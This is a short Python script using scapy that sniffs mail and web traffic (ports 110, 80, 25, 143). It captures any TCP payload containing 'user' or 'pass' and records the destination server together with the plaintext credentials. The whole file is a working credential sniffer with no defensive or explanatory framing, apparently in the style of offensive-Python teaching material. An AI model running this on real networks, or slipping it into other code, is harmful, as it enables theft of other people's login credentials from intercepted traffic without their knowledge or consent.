import threading
from scapy.all import *


# our packet callback
from scapy.layers.inet import TCP, IP

result =''

def packet_callback(packet):
    if packet[TCP].payload:
        global result
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            result+= "[*] Server: %s" % packet[IP].dst
            result+=','
            result+="[*] %s" % packet[TCP].payload
            return result

# fire up our sniffer
def main_runner():
    result = sniff(filter="tcp port 110 or tcp port 80 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
    return result